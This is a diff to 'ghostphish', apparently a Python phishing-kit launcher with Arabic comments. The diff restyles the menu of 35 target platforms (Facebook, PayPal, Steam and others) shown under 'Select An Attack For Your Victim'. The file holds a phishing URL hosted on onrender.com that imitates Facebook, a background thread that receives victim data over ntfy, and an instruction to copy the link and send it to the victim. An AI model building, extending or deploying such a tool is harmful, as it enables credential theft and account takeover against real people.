@@ -9,18 +9,17 @@ import threading
 import time
 import sys
 
-# ========== ألوان الصورة ==========
+# ========== ألوان الصورة بالضبط ==========
 ORANGE = "\033[38;5;208m"   # برتقالي للشعار
-WHITE = "\033[97m"          # أبيض للنصوص
-GREEN = "\033[92m"          # أخضر للأرقام و (مفعل)
-DARK_GRAY = "\033[90m"      # رمادي لـ (غير مفعل)
+RED = '\033[91m'            # أحمر للأقواس والأرقام (مثل الصورة)
+WHITE = '\033[97m'          # أبيض للنصوص العادية والإطارات
 BOLD = '\033[1m'
 RESET = '\033[0m'
-# ===================================
+# ==========================================
 
 CONFIG_FILE = "ghostphish_config.json"
 
-# ─── المنصات الـ 35 كما في الصورة بالضبط ───
+# ─── المنصات الـ 35 بالضبط كما في الصورة (إنجليزي) ───
 PLATFORMS = {
     1: "Facebook", 2: "Instagram", 3: "Google", 4: "Microsoft", 5: "Netflix",
     6: "Paypal", 7: "Steam", 8: "Twitter", 9: "Playstation", 10: "Tiktok",
@@ -33,7 +32,7 @@ PLATFORMS = {
 
 # الروابط (فعلت فيسبوك فقط كمثال، الباقي فارغ)
 LINKS = {i: "" for i in range(1, 36)}
-LINKS[1] = "https://facebook-vjj9.onrender.com"   # رابط فيسبوك مفعل
+LINKS[1] = "https://facebook-vjj9.onrender.com"
 
 def clear_screen():
     os.system('cls' if os.name == 'nt' else 'clear')
@@ -62,30 +61,36 @@ def print_banner():
     print(WHITE + "[::] Select An Attack For Your Victim [::]" + RESET)
 
 def print_menu():
-    # عمودين: الأيسر (1-18) والأيمن (19-35)
-    left_range = range(1, 19)   # 1 إلى 18
-    right_range = range(19, 36) # 19 إلى 35
-
+    # 3 أعمدة: العمود1 (1-10)، العمود2 (11-20)، العمود3 (21-30)
+    # ثم صف منفصل لـ 31,32,33 وآخر لـ 34,35
     print(WHITE + "═" * 60 + RESET)
 
-    for left_num in left_range:
-        right_num = left_num + 18  # لأن 1+18=19، 2+18=20 ... 18+18=36 (لكن 36 غير موجود، نتحقق)
+    # الصفوف من 1 إلى 10 (ثلاثة أعمدة)
+    for i in range(1, 11):
+        col1_num = i
+        col2_num = i + 10
+        col3_num = i + 20
+
+        col1 = f"{RED}[{col1_num:02d}]{RESET} {WHITE}{PLATFORMS[col1_num]}{RESET}"
+        col2 = f"{RED}[{col2_num:02d}]{RESET} {WHITE}{PLATFORMS[col2_num]}{RESET}"
+        col3 = f"{RED}[{col3_num:02d}]{RESET} {WHITE}{PLATFORMS[col3_num]}{RESET}"
         
-        left_name = PLATFORMS[left_num]
-        left_status = f"{GREEN}(مفعل)" if LINKS[left_num] else f"{DARK_GRAY}(غير مفعل)"
-        left_line = f"{GREEN}[{left_num:02d}]{RESET} {WHITE}{left_name}{RESET} {left_status}"
-        
-        right_line = ""
-        if right_num <= 35:
-            right_name = PLATFORMS[right_num]
-            right_status = f"{GREEN}(مفعل)" if LINKS[right_num] else f"{DARK_GRAY}(غير مفعل)"
-            right_line = f"{GREEN}[{right_num:02d}]{RESET} {WHITE}{right_name}{RESET} {right_status}"
-        
-        # ضبط المسافات بحيث يكون العمود الأيمن ثابتاً
-        print(f"{left_line:<45}{right_line}")
+        # ضبط المسافات لتكون 3 أعمدة واضحة (كل عمود عرضه ~18 حرف)
+        print(f"{col1:<20} {col2:<20} {col3}")
+
+    # الصف الحادي عشر: 31, 32, 33
+    col1 = f"{RED}[31]{RESET} {WHITE}{PLATFORMS[31]}{RESET}"
+    col2 = f"{RED}[32]{RESET} {WHITE}{PLATFORMS[32]}{RESET}"
+    col3 = f"{RED}[33]{RESET} {WHITE}{PLATFORMS[33]}{RESET}"
+    print(f"{col1:<20} {col2:<20} {col3}")
+
+    # الصف الثاني عشر: 34, 35 (فقط عمودين)
+    col1 = f"{RED}[34]{RESET} {WHITE}{PLATFORMS[34]}{RESET}"
+    col2 = f"{RED}[35]{RESET} {WHITE}{PLATFORMS[35]}{RESET}"
+    print(f"{col1:<20} {col2}")
 
     print(WHITE + "═" * 60 + RESET)
-    print(f"{GREEN}[99]{RESET} {WHITE}About{RESET}    {GREEN}[00]{RESET} {WHITE}Exit{RESET}")
+    print(f"{RED}[99]{RESET} {WHITE}About{RESET}    {RED}[00]{RESET} {WHITE}Exit{RESET}")
     print(WHITE + "[–] Select an option : " + RESET, end="")
 
 def display_victim_data(message):
@@ -125,7 +130,7 @@ def main():
     secret = load_or_create_secret()
     clear_screen()
     print_banner()
-    print(f"{WHITE}🔑 مفتاحك السري: {GREEN}{secret}{RESET}\n")
+    print(f"{WHITE}🔑 مفتاحك السري: {RED}{secret}{RESET}\n")
     threading.Thread(target=listen_ntfy, args=(secret,), daemon=True).start()
     time.sleep(1)
 
@@ -161,8 +166,8 @@ def main():
                     clear_screen()
                     print_banner()
                     print(WHITE + "═" * 40 + RESET)
-                    print(f"{GREEN}✅ رابط {PLATFORMS[num]}:{RESET}")
-                    print(f"{GREEN}{BOLD}{link}{RESET}")
+                    print(f"{WHITE}✅ رابط {PLATFORMS[num]}:{RESET}")
+                    print(f"{RED}{BOLD}{link}{RESET}")
                     print(WHITE + "═" * 40 + RESET)
                     print(f"{WHITE}انسخ الرابط وأرسله للضحية.{RESET}")
                     input(f"{WHITE}اضغط Enter للرجوع...{RESET}")
